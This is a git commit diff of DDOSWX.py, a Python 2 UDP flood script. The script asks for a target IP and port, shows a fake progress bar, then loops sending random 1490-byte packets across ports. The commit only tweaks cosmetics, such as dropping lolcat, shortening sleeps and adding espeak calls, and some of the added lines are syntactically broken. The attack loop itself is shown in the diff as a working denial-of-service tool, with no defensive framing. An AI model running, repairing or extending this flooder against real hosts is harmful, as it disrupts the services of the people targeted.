ce37220b7bc6c420655b8b534b2b2ca8b4bd4def
Wxsad <93474444+WIROUX@users.noreply.github.com>
2022-01-08 15:10:40 +0330

    Update DDOSWX.py

--- DDOSWX.py
+++ DDOSWX.py
@@ -1,4 +1,3 @@
-system('pkg install lolcat')
 import sys
 import os
 import time
@@ -17,28 +16,29 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 #############
 os.system("clear")
-os.system("figlet DDos WX | lolcat")
+os.system("figlet DDos WX")
 print
 print "macker   : WX"
 print "telegram : https://t.me/Sad_Wx_virus"
 print "github   : https://github.com/WIROUX"
 print
 ip = raw_input("IP Target : ")
-port = input("Port       : ")
+port = input("Port        : ")
 
 os.system("clear")
-os.system("figlet DDos WX | lolcat")
-os.system("figlet Attack WX | lolcat")
+os.system("figlet DDos WX")
+os.system("figlet Attack WX")
 print "[--------------------] 0% "
-time.sleep(5)
+time.sleep(4)
 print "[>>>>>---------------] 25%"
-time.sleep(5)
+time.sleep(4)
 print "[>>>>>>>>>>----------] 50%"
-time.sleep(5)
+time.sleep(4)
 print "[>>>>>>>>>>>>>>>-----] 75%"
-time.sleep(5)
+time.sleep(4)
 print "[>>>>>>>>>>>>>>>>>>>>] 100%"
 print "GO GO GO"
+os.system("espeak "berim sickesh konim"")
 time.sleep(3)
 sent = 0
 while True:
@@ -46,5 +46,6 @@ while True:
      sent = sent + 1
      port = port + 1
      print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     os.system("espeak "ridi"")
      if port == 65534:
        port = 1
